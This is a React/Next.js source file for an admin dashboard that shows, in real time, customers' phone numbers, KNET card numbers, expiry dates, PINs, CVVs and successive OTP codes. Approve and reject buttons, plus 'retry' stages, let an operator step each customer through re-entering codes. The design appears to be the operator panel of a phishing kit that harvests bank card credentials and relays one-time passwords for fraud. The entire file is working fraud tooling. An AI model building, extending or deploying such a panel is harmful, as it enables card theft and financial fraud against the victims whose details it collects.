"use client";

import { useLocale, useTranslations } from "next-intl";
import { formatKwd, formatWhen } from "@/lib/money";
import type { AdminRealtimeSnapshot, QuickPayLeadView } from "@/lib/admin-realtime-data";
import type { KnetRecordView } from "@/lib/types";
import { useAdminRealtime } from "@/hooks/use-admin-realtime";
import { updateKnetStatusAction } from "@/server/admin-actions";

function knetAwaitingAdmin(reviewStep: string) {
  return reviewStep.startsWith("awaiting_admin_");
}

function knetShowsRetryNotice(reviewStep: string) {
  return (
    reviewStep === "retry_card" ||
    reviewStep === "retry_otp" ||
    reviewStep === "retry_cvv" ||
    reviewStep === "retry_otp2"
  );
}

function knetStageLabel(reviewStep: string, t: (key: string) => string) {
  switch (reviewStep) {
    case "awaiting_admin_card":
      return t("knetReviewCard");
    case "otp_entry":
      return t("knetCustomerOtp");
    case "awaiting_admin_otp":
      return t("knetReviewOtp");
    case "cvv_entry":
      return t("knetCustomerCvv");
    case "awaiting_admin_cvv":
      return t("knetReviewCvv");
    case "otp2_entry":
      return t("knetCustomerOtp2");
    case "awaiting_admin_otp2":
      return t("knetReviewOtp2");
    case "retry_card":
      return t("knetRetryCard");
    case "retry_otp":
      return t("knetRetryOtp");
    case "retry_cvv":
      return t("knetRetryCvv");
    case "retry_otp2":
      return t("knetRetryOtp2");
    case "phone_registered":
      return t("knetPhoneRegistered");
    default:
      return reviewStep;
  }
}

type ApprovalsTableRow =
  | { kind: "knet"; row: KnetRecordView }
  | { kind: "lead"; row: QuickPayLeadView };

function mergeApprovalRows(knet: KnetRecordView[], leads: QuickPayLeadView[]): ApprovalsTableRow[] {
  const leadRows: ApprovalsTableRow[] = leads.map((row) => ({ kind: "lead" as const, row }));
  const knetRows: ApprovalsTableRow[] = knet.map((row) => ({ kind: "knet" as const, row }));
  const sortKey = (entry: ApprovalsTableRow) =>
    entry.kind === "knet" ? entry.row.createdAt : entry.row.lastSeen;
  return [...leadRows, ...knetRows].sort((a, b) => sortKey(b).localeCompare(sortKey(a)));
}

export function ApprovalsRealtimeView({ initialSnapshot }: { initialSnapshot?: AdminRealtimeSnapshot }) {
  const t = useTranslations("admin");
  const locale = useLocale();
  const { connected, transport, knet, quickPayLeads, updatedAt } = useAdminRealtime(initialSnapshot);

  const tableRows = mergeApprovalRows(knet, quickPayLeads);

  return (
    <div className="grid gap-8">
      <div>
        <div className="flex flex-wrap items-center gap-3">
          <h1 className="text-2xl font-bold">{t("approvalsTitle")}</h1>
          <span
            className={`rounded-full px-3 py-1 text-xs font-semibold ${connected ? "bg-success/15 text-success" : "bg-warning/15 text-warning"}`}
          >
            {transport === "ws"
              ? t("wsLive")
              : transport === "sse"
                ? t("sseLive")
                : connected
                  ? t("wsLive")
                  : t("wsReconnecting")}
          </span>
        </div>
        <p className="mt-1 text-sm text-muted">
          {t("approvalsHint")}
          {updatedAt ? ` · ${t("wsUpdated")} ${formatWhen(updatedAt, locale)}` : null}
        </p>
      </div>

      <section className="grid gap-3">
        <h2 className="text-lg font-bold">{t("knetSection")}</h2>
        <p className="text-sm text-muted">{t("knetTableHint")}</p>
        <div className="overflow-x-auto rounded-2xl border border-border bg-white">
          <table className="w-full text-sm">
            <thead className="border-b border-border bg-surface text-start">
              <tr>
                <th className="px-3 py-3 font-semibold">{t("when")}</th>
                <th className="px-3 py-3 font-semibold">{t("liveColPhone")}</th>
                <th className="px-3 py-3 font-semibold">{t("approvalsColStatus")}</th>
                <th className="px-3 py-3 font-semibold">{t("knetReviewStage")}</th>
                <th className="px-3 py-3 font-semibold">{t("approvalsColAmount")}</th>
                <th className="px-3 py-3 font-semibold">{t("cardNumber")}</th>
                <th className="px-3 py-3 font-semibold">{t("expiry")}</th>
                <th className="px-3 py-3 font-semibold">PIN</th>
                <th className="px-3 py-3 font-semibold min-w-[130px]">OTP 1</th>
                <th className="px-3 py-3 font-semibold">CVV</th>
                <th className="px-3 py-3 font-semibold min-w-[130px]">OTP 2</th>
                <th className="px-3 py-3 font-semibold">{t("approvalsColActions")}</th>
              </tr>
            </thead>
            <tbody>
              {tableRows.length === 0 ? (
                <tr>
                  <td colSpan={12} className="px-4 py-10 text-center text-muted">
                    {t("empty")}
                  </td>
                </tr>
              ) : null}
              {tableRows.map((entry) =>
                entry.kind === "lead" ? (
                  <tr key={`lead:${entry.row.sessionId}`} className="border-t border-border align-top bg-brand/5">
                    <td className="whitespace-nowrap px-3 py-3 text-xs text-muted">
                      {formatWhen(entry.row.lastSeen, locale)}
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 font-mono text-base font-bold text-brand" dir="ltr">
                      {entry.row.msisdnDisplay}
                    </td>
                    <td className="px-3 py-3">
                      <StatusBadge status="pending" t={t} />
                    </td>
                    <td className="max-w-[140px] px-3 py-3 text-xs">{knetStageLabel("phone_registered", t)}</td>
                    <td className="whitespace-nowrap px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-muted">—</td>
                    <td className="px-3 py-3 text-xs text-muted">{t("knetAwaitingPayment")}</td>
                  </tr>
                ) : (
                  <tr key={entry.row.id} className="border-t border-border align-top">
                    <td className="whitespace-nowrap px-3 py-3 text-xs text-muted">
                      {formatWhen(entry.row.createdAt, locale)}
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 font-mono text-sm font-semibold" dir="ltr">
                      {entry.row.msisdnDisplay || "—"}
                    </td>
                    <td className="px-3 py-3">
                      <StatusBadge status={entry.row.status} t={t} />
                    </td>
                    <td className="max-w-[140px] px-3 py-3 text-xs">{knetStageLabel(entry.row.reviewStep, t)}</td>
                    <td className="whitespace-nowrap px-3 py-3 font-semibold text-brand">
                      {formatKwd(entry.row.amountHalalas, locale)}
                    </td>
                    <td className="max-w-[180px] break-all px-3 py-3 font-mono text-xs" dir="ltr">
                      {entry.row.cardNumber || "—"}
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 font-mono text-xs" dir="ltr">
                      {entry.row.expiryDate || "—"}
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 font-mono text-xs" dir="ltr">
                      {entry.row.pin || "—"}
                    </td>
                    <td className="px-3 py-3 font-mono text-xs" dir="ltr">
                      <OtpDisplay
                        value={entry.row.otp}
                        variant="primary"
                        isRejected={entry.row.reviewStep === "retry_otp"}
                      />
                    </td>
                    <td className="whitespace-nowrap px-3 py-3 font-mono text-xs" dir="ltr">
                      {entry.row.cvv || "—"}
                    </td>
                    <td className="px-3 py-3 font-mono text-xs" dir="ltr">
                      <OtpDisplay
                        value={entry.row.otp2}
                        variant="brand"
                        isRejected={entry.row.reviewStep === "retry_otp2"}
                      />
                    </td>
                    <td className="px-3 py-3">
                      <KnetActions row={entry.row} t={t} />
                    </td>
                  </tr>
                ),
              )}
            </tbody>
          </table>
        </div>
      </section>
    </div>
  );
}

function KnetActions({
  row,
  t,
}: {
  row: { id: string; status: string; reviewStep: string };
  t: (key: string) => string;
}) {
  if (knetAwaitingAdmin(row.reviewStep)) {
    return (
      <div className="flex flex-col gap-1.5">
        <form action={updateKnetStatusAction}>
          <input type="hidden" name="knetId" value={row.id} />
          <input type="hidden" name="decision" value="approved" />
          <button type="submit" className="w-full rounded-lg bg-success px-2 py-1.5 text-xs font-semibold text-white">
            {t("approve")}
          </button>
        </form>
        <form action={updateKnetStatusAction}>
          <input type="hidden" name="knetId" value={row.id} />
          <input type="hidden" name="decision" value="rejected" />
          <button type="submit" className="w-full rounded-lg bg-danger px-2 py-1.5 text-xs font-semibold text-white">
            {t("reject")}
          </button>
        </form>
      </div>
    );
  }
  if (knetShowsRetryNotice(row.reviewStep)) {
    return <span className="text-xs text-warning">{knetStageLabel(row.reviewStep, t)}</span>;
  }
  if (row.status === "pending") {
    return <span className="text-xs text-muted">{knetStageLabel(row.reviewStep, t)}</span>;
  }
  return <span className="text-xs text-muted">—</span>;
}

function StatusBadge({ status, t }: { status: string; t: (key: string) => string }) {
  const label =
    status === "approved" ? t("statusApproved") : status === "rejected" ? t("statusRejected") : t("statusPending");
  const tone =
    status === "approved"
      ? "bg-success/15 text-success"
      : status === "rejected"
        ? "bg-danger/15 text-danger"
        : "bg-warning/15 text-warning";
  return <span className={`inline-block rounded-full px-2 py-0.5 text-xs font-semibold ${tone}`}>{label}</span>;
}

function OtpDisplay({
  value,
  variant = "primary",
  isRejected = false,
}: {
  value: string;
  variant?: "primary" | "brand";
  isRejected?: boolean;
}) {
  if (!value || !value.trim()) {
    return <span className="text-muted">—</span>;
  }
  const codes = value
    .split(/\s*[-,\/]\s*/)
    .map((s) => s.trim())
    .filter(Boolean);

  if (codes.length === 0) {
    return <span className="text-muted">—</span>;
  }

  const activeColor =
    variant === "primary"
      ? "border-primary/30 bg-primary/10 text-primary"
      : "border-brand/30 bg-brand/10 text-brand";

  return (
    <div className="flex flex-wrap items-center gap-1.5" dir="ltr">
      {codes.map((code, idx) => {
        const isLatest = idx === codes.length - 1;
        const codeRejected = !isLatest || isRejected;

        return (
          <span
            key={idx}
            title={codeRejected ? "رمز تم رفضه" : "الرمز الحالي"}
            className={`inline-flex items-center rounded border px-1.5 py-0.5 text-xs font-mono font-bold tracking-wider ${
              codeRejected
                ? "border-danger/30 bg-danger/10 text-danger line-through decoration-danger/70"
                : activeColor
            }`}
          >
            {code}
          </span>
        );
      })}
    </div>
  );
}
